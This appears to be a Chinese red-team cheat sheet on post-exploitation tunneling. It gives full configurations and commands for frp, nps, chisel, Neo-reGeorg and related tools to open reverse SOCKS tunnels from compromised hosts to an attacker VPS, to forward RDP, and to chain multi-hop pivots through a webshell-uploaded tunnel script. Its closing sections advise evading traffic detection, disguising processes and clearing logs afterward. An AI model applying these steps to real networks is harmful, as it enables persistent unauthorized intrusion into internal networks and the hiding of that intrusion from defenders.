# 内网穿透与代理（frp / nps / chisel / Neo-reGeorg）

## 0x01 概述

拿下 Webshell 或主机立足点后，目标往往**只有出站能力**（入站被防火墙/安全组拦死），此时需要建立稳定的代理通道进入内网。

与 [PEN-ssh](./PEN-ssh.md)（SSH 原生隧道）互补：

- SSH 场景（有凭证、有 sshd）→ 看 [PEN-ssh](./PEN-ssh.md)，断线重连用 autossh；
- 无 SSH 场景（纯 Webshell、Windows 目标、无公网入站）→ 本文 frp / nps / chisel；
- 只出 HTTP(S) 的强隐蔽场景 → 本文 Neo-reGeorg。

拿到 SOCKS5 代理后的全局流量接管见 [PEN-Tun2socks](./PEN-Tun2socks.md)。

## 0x02 选型决策表

| 场景 | 推荐 |
| --- | --- |
| 目标只出 TCP、手上有公网 VPS | frp |
| 目标只出 HTTP(S)（代理白名单/仅 80、443 出站） | Neo-reGeorg / 冰蝎内网穿透 |
| 短平快单端口转发 | chisel / iox / socat |
| Windows 目标、不方便落地 exe | nps 不行（要落地客户端）——用 PowerShell 加载的 chisel/iox，或 EarthWorm（ew.exe 小体积） |
| 大流量 SOCKS（扫描/横向移动） | frp socks5 / chisel reverse |
| 多级节点、多路人马协作 | Stowaway / venom |

## 0x03 frp（最主流）

Go 编写、单二进制跨平台、配置简单、稳定扛造，有 VPS 时的首选。

### 1. 服务端 frps.toml（v0.52+ 使用 TOML 配置）

```toml
# frps.toml —— 部署在公网 VPS 上
bindPort = 7000          # 客户端连接端口
auth.token = "S3cr3t-T0ken"   # 认证令牌，两端必须一致
transport.tls.force = true    # 强制只接受 TLS 连接，拒绝裸协议探测
webServer.port = 7500         # 可选：dashboard 管理面板
webServer.user = "admin"
webServer.password = "P@ssw0rd"
```

```bash
./frps -c frps.toml   # 启动服务端
```

### 2. 客户端 frpc.toml

```toml
# frpc.toml —— 部署在目标内网主机上
serverAddr = "1.2.3.4"        # VPS 公网 IP
serverPort = 7000
auth.token = "S3cr3t-T0ken"
transport.tls.enable = true        # 启用 TLS，防流量审查
transport.useEncryption = true     # 代理内容再加密一层
transport.useCompression = true    # 传输压缩

[[proxies]]
name = "socks5"
type = "tcp"
remotePort = 1080              # 在 VPS 上开 1080 作 socks5 入口
[proxies.plugin]
type = "socks5"                # 插件方式启动 socks5，无需在目标机装代理软件
```

```bash
./frpc -c frpc.toml   # 启动客户端（Windows: frpc.exe -c frpc.toml）
```

### 3. 常用场景配置

```toml
# 场景一：把目标内网 Web 映射到 VPS
[[proxies]]
name = "intranet-web"
type = "tcp"
localIP = "10.0.0.5"
localPort = 8080
remotePort = 18080     # VPS:18080 → 10.0.0.5:8080

# 场景二：RDP 转发（打 Windows 内网机）
[[proxies]]
name = "rdp"
type = "tcp"
localIP = "10.0.0.5"
localPort = 3389
remotePort = 13389     # mstsc 连 VPS:13389 即可

# 场景三：stcp 点对点加密（流量不经过 frps 中转暴露端口，
# 需要另一台"访问端"机器也运行 frpc，secretKey 两端一致）
[[proxies]]
name = "secret-rdp"
type = "stcp"
secretKey = "stcp-key-123"
localIP = "10.0.0.5"
localPort = 3389
```

stcp 访问端（攻击机上）的配置：

```toml
# frpc-visitor.toml
serverAddr = "1.2.3.4"
serverPort = 7000
auth.token = "S3cr3t-T0ken"

[[visitors]]
name = "secret-rdp-visitor"
type = "stcp"
serverName = "secret-rdp"     # 对应上面的 proxies.name
secretKey = "stcp-key-123"
bindAddr = "127.0.0.1"
bindPort = 13389              # 本地 13389 → 内网 10.0.0.5:3389
```

### 4. 特征与对抗

- 默认特征流量已带 TLS（`transport.tls.enable`），未设 token 时匿名即可连上，极易被蓝队用公开 frpc 反向利用；
- 改特征一句话：改掉 7000 默认端口（伪装成 443/8443），设置强 `auth.token`，开启 `transport.tls.force` 只留加密流量。

## 0x04 nps

轻量内网穿透服务端，带 Web 管理台，多隧道图形化配置。

```bash
# 服务端（VPS）安装并启动
./nps install
./nps start        # web 管理台默认 http://VPS:8080
```

- 配置文件 `conf/nps.conf`：改 `web_port`（管理台）、`bridge_port`（默认 8024，客户端连接口）、`web_username/password`。

```bash
# 客户端（目标机）——vkey 在 web 台"客户端"页面新建后获得
./npc -server=1.2.3.4:8024 -vkey=xxxxxx
```

- 在 web 管理台给该客户端添加隧道：socks5 代理、TCP/UDP 转发、HTTP 代理均可点点鼠标完成。

优点：图形化管理多隧道，适合多目标长期维护；缺点：**web 管理台一旦暴露（弱口令/未授权）即全线失守**，务必改默认口令 `admin/123` 并限制访问来源。

## 0x05 chisel（轻量）

单二进制、零依赖、反向 SOCKS 一行命令，临时横向时比 frp 更快。

```bash
# 服务端（VPS），--reverse 允许客户端反向开端口
chisel server -p 8000 --reverse --auth user:pass

# 客户端（目标机），反弹 socks 到 VPS:1080
chisel client 1.2.3.4:8000 R:socks

# 单端口转发：把内网 10.0.0.5 的 RDP 拉到 VPS:3389
chisel client 1.2.3.4:8000 R:3389:10.0.0.5:3389
```

- 单二进制跨平台，Go 交叉编译小体积：

```bash
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o chisel.exe   # 去符号表减小体积
```

- 反弹 socks（`R:socks`）是最常用姿势；加 `--auth` 防端口被第三方蹭用。
- 目标机不能落地 exe 时，可用 PowerShell 反射加载或内存执行方式拉起。

## 0x06 Neo-reGeorg（HTTP 隧道）

### 1. 原理

webshell 加密隧道：把 TCP 流量封装进 HTTP POST 请求，进出站流量看起来就是一组正常的 Web 访问，适合只放行 HTTP(S) 的目标。

### 2. 用法

```bash
# 生成加密隧道脚本（-k 为密钥）
python neoreg.py generate -k p@ssw0rd
# 生成 tunnel.php / tunnel.jsp / tunnel.aspx 等多语言版本
```

把对应语言的 tunnel 脚本上传到目标 Web 可访问目录，然后：

```bash
# 本地建立 socks5 代理，默认监听 127.0.0.1:1080
python neoreg.py -k p@ssw0rd -u http://target/tunnel.php
```

本地 `socks5 127.0.0.1:1080` 即可进内网，搭配 proxychains / Proxifier 使用。

### 3. 对比冰蝎/哥斯拉

冰蝎/哥斯拉自带"内网穿透（SocksCap 类）"功能，能直接复用现有 Webshell 免再传文件，省事；但 Neo-reGeorg 支持自定义请求特征、多脚本语言、密钥加密，独立于工具存活更稳——一句话：临时用冰蝎内置，长期驻留用 Neo-reGeorg。

## 0x07 其他工具速查

- **iox**：无特征优化（流量伪装、可自定义 header）、多路复用（一条连接跑多路代理），支持正向/反向/级联。
- **EarthWorm（ew）**：老牌工具，正向 `ew -s ssocksd -l 1080`、反向 `ew -s rssocks -d VPS -e 8888` + `ew -s lcx_listen`，exe 体积小，Windows 落地方便。
- **reGeorg**：Neo-reGeorg 前代，早期仅简单编码、特征明显，现已基本被 Neo 替代。
- **socat**：Linux 落地单端口转发神器，一行搞定：

```bash
socat TCP-LISTEN:8080,fork TCP:10.0.0.5:80   # 本机 8080 → 内网 10.0.0.5:80
```

- **venom**：多级节点管理（admin/agent 架构），节点间可交互式管理、文件上传，适合团队协作。
- **Stowaway**：多级代理，支持 TCP/KCP/WebSocket 多种底层传输，节点可增删、级联自动路由。

## 0x08 代理链使用

### 1. proxychains / proxychains4

```text
# /etc/proxychains4.conf（或 proxychains.conf）
# 建议关闭 strict_chain 换 dynamic_chain，节点挂掉不致命
socks5  127.0.0.1 1080
```

```bash
proxychains4 curl http://10.0.0.5/          # 让 curl 走 socks
proxychains4 nmap -sT -Pn -n 10.0.0.0/24    # 经代理只能用 -sT 全连接扫描
```

### 2. 多级代理（边界机 → 内网机 → 核心区）

以 chisel 级联为例：

```text
攻击机 ← VPS(chisel server :8000)
             ↑ R:socks
         边界机(chisel client) ── 本地再起 server :8001
                                       ↑ R:socks（反弹到边界机 1080）
                                   内网机A(chisel client)
```

```bash
# 1. 边界机：一级反弹 socks 到 VPS
chisel client 1.2.3.4:8000 R:socks

# 2. 边界机：再起一个 server 供内网机A回连
chisel server -p 8001 --reverse

# 3. 内网机A：二级反弹 socks 到边界机
chisel client 边界机IP:8001 R:socks

# 4. 边界机：把二级 socks 也映射回 VPS（VPS:1081 → 边界机:1080）
chisel client 1.2.3.4:8000 R:1081:127.0.0.1:1080
```

最终：VPS:1080 通边界机可达网段，VPS:1081 通内网机A可达网段。frp 同理（在内网机A上再跑一个 frpc 指向边界机上另起的 frps）。proxychains 里链式串联：

```text
# 多级串联：先过一级再过二级
socks5 127.0.0.1 1080
socks5 127.0.0.1 1081
```

### 3. 工具经代理

```bash
# curl：socks5h 表示 DNS 解析也交给代理端（防 DNS 泄漏）
curl --proxy socks5h://127.0.0.1:1080 http://10.0.0.5/

# nmap：经代理只能全连接扫描
nmap -sT -Pn -n --proxy-type socks4 --proxy 127.0.0.1:1080 10.0.0.5 -p 80,445,3389
```

- RDP / 图形工具：Windows 攻击机用 SocksCap64 或 Proxifier 强制 `mstsc.exe` 走 socks；全局接管见 [PEN-Tun2socks](./PEN-Tun2socks.md)。

## 0x09 隐蔽与对抗

### 1. 流量加密

- frp：`transport.tls.enable + transport.useEncryption`，服务端 `tls.force` 只收加密流量；
- chisel：默认 TLS 传输，加 `--auth` 认证，必要时用 `--tls-domain` 伪装成正常站点证书域；
- Neo-reGeorg：`-k` 密钥全程加密，`--header` 自定义请求头、`--skip` 自定义 URL 参数混淆请求特征。

### 2. 心跳与长连接特征

- frp 有默认心跳保活（固定间隔的短包 + 长连接），易被 NTA 识别为"隧道类流量"；可调大 `transport.heartbeatInterval`、启用 TLS 加密掩盖；
- chisel / neoreg 同理：避免 24 小时高频率连接，任务做完及时拆线。

### 3. 断线重连

- frp 客户端自带自动重连，VPS 重启后通道自愈；
- SSH 隧道场景用 autossh 保活（见 [PEN-ssh](./PEN-ssh.md)）；
- chisel 无自动重连，掉线需重新拉起（可写计划任务/开机脚本兜底）。

### 4. 日志痕迹

- Web 中间件 access log 中，tunnel.php 会出现**密集、固定长度区间、间隔规律的 POST**——典型特征，行动后配合 [PEN-LinuxClear](./PEN-LinuxClear.md) / [PEN-WinClear](./PEN-WinClear.md) 处理；
- frps/frpc 进程名、命令行参数（含 serverAddr）落地即暴露 VPS，注意改名与隐藏启动方式（可交叉参考 [PEN-ReShell](./PEN-ReShell.md)）。

## Ref

- frp：https://github.com/fatedier/frp
- nps：https://github.com/ehang-io/nps
- chisel：https://github.com/jpillora/chisel
- Neo-reGeorg：https://github.com/L-codes/Neo-reGeorg
- iox：https://github.com/EddieIvan01/iox
- Stowaway：https://github.com/ph4ntonn/Stowaway
- venom：https://github.com/Dliv3/Venom
- socat：http://www.dest-unreach.org/socat/
